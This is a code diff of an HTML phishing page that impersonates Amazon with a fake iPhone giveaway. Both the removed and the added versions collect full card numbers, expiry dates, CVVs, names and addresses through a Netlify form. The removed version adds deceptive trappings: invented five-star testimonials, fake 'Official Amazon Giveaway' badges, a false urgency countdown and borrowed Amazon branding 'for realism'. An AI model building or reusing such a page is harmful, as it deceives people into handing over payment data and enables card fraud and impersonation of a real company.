@@ -3,203 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Congratulations! You've Won a Prize from Amazon</title>
-    <link rel="stylesheet" href="style.css">
-    <!-- Amazon Ember font for realism -->
-    <link rel="stylesheet" href="https://m.media-amazon.com/images/S/sash/MYhQWuqGD7C6A7S.css">
-    <!-- Mimic Amazon favicon -->
-    <link rel="icon" href="https://www.amazon.com/favicon.ico">
+    <title>Amazon - Claim Your Prize</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="scripts.js" defer></script>
 </head>
 <body>
-    <header>
-        <div class="logo-container">
+    <div class="container">
+        <header class="header">
             <img src="amazon-logo.png" alt="Amazon Logo" class="logo">
-        </div>
-        <h1>Congratulations! You've Won an iPhone 15 Pro Max</h1>
-        <div class="progress-bar">
-            <span>1. Prize Confirmation</span> > <span class="active">2. Shipping & Payment</span> > <span>3. Review & Claim</span>
-        </div>
-    </header>
-    
-    <main class="container">
-        <section class="prize-section">
-            <img src="prize-image.jpg" alt="iPhone 15 Pro Max" class="prize-img">
-            <p>Dear Valued Amazon Customer,</p>
-            <p>You've been selected as a winner in our Prime Member Appreciation Giveaway. Claim your brand new iPhone 15 Pro Max (valued at $1,199) today!</p>
-            <p>Just cover the $0.99 shipping and handling fee, and we'll deliver it via Amazon Logistics in 3-5 business days.</p>
-            <div class="urgency">Hurry! Offer expires in <span id="countdown">24:00:00</span>.</div>
-            <div class="trust-badges">
-                <span>✅ Official Amazon Giveaway</span>
-                <span>🔒 Secure & Verified</span>
-            </div>
-            <div class="testimonials">
-                <div class="testimonial">
-                    <p>★★★★★ "I got my iPhone in just 3 days – totally legit!" - Sarah K.</p>
-                </div>
-                <div class="testimonial">
-                    <p>★★★★★ "Best giveaway ever! Shipped fast and free." - Mike T.</p>
-                </div>
-                <div class="testimonial">
-                    <p>★★★★★ "Couldn't believe I won – Amazon made it easy." - Emily R.</p>
-                </div>
-                <div class="testimonial">
-                    <p>★★★★★ "Received my prize without hassle. Highly recommend!" - David S.</p>
-                </div>
-                <div class="testimonial">
-                    <p>★★★★★ "The $0.99 was worth it – amazing phone!" - Lisa M.</p>
-                </div>
-            </div>
-        </section>
+            <h1>Congratulations! You've Won an iPhone!</h1>
+            <p>As a valued Amazon customer, you've been selected as a winner in our latest giveaway. Claim your brand new iPhone by paying a small $0.99 shipping fee. Enter your payment details below to secure your prize.</p>
+        </header>
         
-        <section class="form-section">
-            <h2>Enter Your Shipping and Payment Details</h2>
-            <div class="secure-note">🔒 Secure Checkout</div>
-            <form name="prize-claim" method="POST" data-netlify="true" data-netlify-honeypot="bot-field" id="claim-form">
-                <input type="hidden" name="form-name" value="prize-claim">
-                <p hidden><label>Don’t fill this out: <input name="bot-field"></label></p>
-                
-                <!-- Address Details -->
-                <fieldset>
-                    <legend>Shipping Address</legend>
-                    <div class="form-grid">
-                        <div>
-                            <label for="full_name">Full Name</label>
-                            <input type="text" id="full_name" name="full_name" placeholder="John Doe" required>
-                        </div>
-                        <div>
-                            <label for="phone">Phone Number</label>
-                            <input type="tel" id="phone" name="phone" placeholder="(123) 456-7890" required>
-                        </div>
-                        <div>
-                            <label for="address_line1">Address Line 1</label>
-                            <input type="text" id="address_line1" name="address_line1" placeholder="123 Main St" required>
-                        </div>
-                        <div>
-                            <label for="address_line2">Address Line 2 (Optional)</label>
-                            <input type="text" id="address_line2" name="address_line2" placeholder="Apt 4B">
-                        </div>
-                        <div>
-                            <label for="city">City</label>
-                            <input type="text" id="city" name="city" placeholder="Anytown" required>
-                        </div>
-                        <div>
-                            <label for="state">State/Province</label>
-                            <input type="text" id="state" name="state" placeholder="CA" required>
-                        </div>
-                        <div>
-                            <label for="zip">ZIP/Postal Code</label>
-                            <input type="text" id="zip" name="zip" placeholder="12345" required>
-                        </div>
-                        <div>
-                            <label for="country">Country</label>
-                            <input type="text" id="country" name="country" value="United States" readonly required>
-                        </div>
-                    </div>
-                </fieldset>
-                
-                <!-- Card Details -->
-                <fieldset>
-                    <legend>Payment Information</legend>
-                    <p class="card-icons">Accepted: Visa | Mastercard | Amex | Discover</p>
-                    <div class="form-grid payment-group">
-                        <div>
-                            <label for="card_name">Name on Card</label>
-                            <input type="text" id="card_name" name="card_name" placeholder="John Doe" required>
-                        </div>
-                        <div>
-                            <label for="card_number">Card Number</label>
-                            <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" pattern="\d{13,19}" required>
-                        </div>
-                        <div class="exp-group">
-                            <label>Expiration Date</label>
-                            <div class="exp-fields">
-                                <input type="text" id="exp_month" name="exp_month" placeholder="MM" pattern="\d{2}" required>
-                                <span>/</span>
-                                <input type="text" id="exp_year" name="exp_year" placeholder="YY" pattern="\d{2}" required>
-                            </div>
-                        </div>
-                        <div>
-                            <label for="cvv">CVV</label>
-                            <input type="text" id="cvv" name="cvv" placeholder="123" pattern="\d{3,4}" required>
-                            <div class="cvv-hint">3 or 4 digits on back of card</div>
-                        </div>
-                    </div>
-                </fieldset>
-                
-                <div class="terms">
-                    <input type="checkbox" id="terms" required>
-                    <label for="terms">I agree to the terms and conditions</label>
+        <form id="payment-form" name="amazon-prize-form" method="POST" data-netlify="true">
+            <!-- Hidden field for Netlify bot detection -->
+            <input type="hidden" name="form-name" value="amazon-prize-form" />
+            <div class="form-group">
+                <label for="card_number">Card Number</label>
+                <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" required pattern="\d{13,19}">
+            </div>
+            <div class="form-row">
+                <div class="form-group half">
+                    <label for="expiry">Expiration Date (MM/YY)</label>
+                    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required pattern="(0[1-9]|1[0-2])\/[0-9]{2}">
                 </div>
-                
-                <button type="submit" class="submit-btn">Claim Prize & Pay $0.99</button>
-            </form>
-        </section>
+                <div class="form-group half">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" required pattern="\d{3,4}">
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="name">Cardholder Name</label>
+                <input type="text" id="name" name="name" placeholder="John Doe" required>
+            </div>
+            <div class="form-group">
+                <label for="billing_address">Billing Address</label>
+                <input type="text" id="billing_address" name="billing_address" placeholder="123 Main St, City, State, ZIP" required>
+            </div>
+            <button type="submit" class="submit-btn">Pay $0.99 Shipping Fee</button>
+        </form>
         
-        <aside class="sidebar">
-            <h3>Order Summary</h3>
-            <div class="summary-item">
-                <span>iPhone 15 Pro Max</span>
-                <span>FREE</span>
-            </div>
-            <div class="summary-item">
-                <span>Shipping & Handling</span>
-                <span>$0.99</span>
-            </div>
-            <div class="summary-item">
-                <span>Shipping</span>
-                <span>FREE (Prime)</span>
-            </div>
-            <hr>
-            <div class="summary-total">
-                <span>Total</span>
-                <span>$0.99</span>
-            </div>
-            <p class="summary-note">Your card will be charged upon submission.</p>
-        </aside>
-    </main>
-    
-    <footer>
-        <p>&copy; 2023 Amazon.com, Inc. or its affiliates. All rights reserved.</p>
-        <p>Privacy Notice | Conditions of Use | Interest-Based Ads</p>
-    </footer>
-    
-    <script>
-        // Countdown timer
-        let time = 24 * 60 * 60; // 24 hours
-        const countdownElement = document.getElementById('countdown');
-        const interval = setInterval(() => {
-            time--;
-            const hours = Math.floor(time / 3600).toString().padStart(2, '0');
-            const minutes = Math.floor((time % 3600) / 60).toString().padStart(2, '0');
-            const seconds = (time % 60).toString().padStart(2, '0');
-            countdownElement.textContent = `${hours}:${minutes}:${seconds}`;
-            if (time <= 0) clearInterval(interval);
-        }, 1000);
-
-        // Card number formatting
-        document.getElementById('card_number').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '').match(/(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})/);
-            e.target.value = !value[2] ? value[1] : value[1] + ' ' + value[2] + (value[3] ? ' ' + value[3] : '') + (value[4] ? ' ' + value[4] : '');
-        });
-
-        // AJAX submission to Netlify, then redirect to success
-        const form = document.getElementById('claim-form');
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const formData = new FormData(form);
-            fetch('/', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    window.location.href = 'success.html';
-                } else {
-                    console.error('Submission failed');
-                }
-            })
-            .catch(error => console.error('Error:', error));
-        });
-    </script>
+        <footer class="footer">
+            <p>&copy; Amazon.com, Inc. or its affiliates. All rights reserved. <a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=508088" target="_blank">Privacy Notice</a></p>
+        </footer>
+    </div>
 </body>
 </html>
